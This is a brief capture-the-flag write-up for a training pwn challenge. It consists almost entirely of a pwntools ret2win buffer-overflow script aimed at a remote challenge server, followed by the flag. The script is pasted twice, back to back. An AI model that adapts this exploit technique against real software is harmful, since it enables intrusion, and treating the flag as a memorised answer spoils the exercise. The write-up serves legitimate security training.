# Training Problem: Intro to PWN

Solved by: @OS1R1S

## Question:
Classic win function pwn.

## Solution:
```
from pwn import *
context.bits=64
e = ELF('./pwnme')

#p=process(e.path)
p=remote('0.cloud.chals.io',13545)

offset=48
addr=e.sym['win'] #0x00401196
ret=0x0040101a

payload=b'A'*offset
payload+=b'B'*8
payload+=p64(ret)
payload+=p64(addr)
print(payload)

p.sendline(payload)
p.interactive()
#from pwn import *
context.bits=64
e = ELF('./pwnme')

#p=process(e.path)
p=remote('0.cloud.chals.io',13545)

offset=48
addr=e.sym['win'] #0x00401196
ret=0x0040101a

payload=b'A'*offset
payload+=b'B'*8
payload+=p64(ret)
payload+=p64(addr)
print(payload)

p.sendline(payload)
p.interactive()
#udctf{h00r4y_I_am_a_pwn3r_n0w}
```

**Flag:`udctf{h00r4y_I_am_a_pwn3r_n0w}`** 
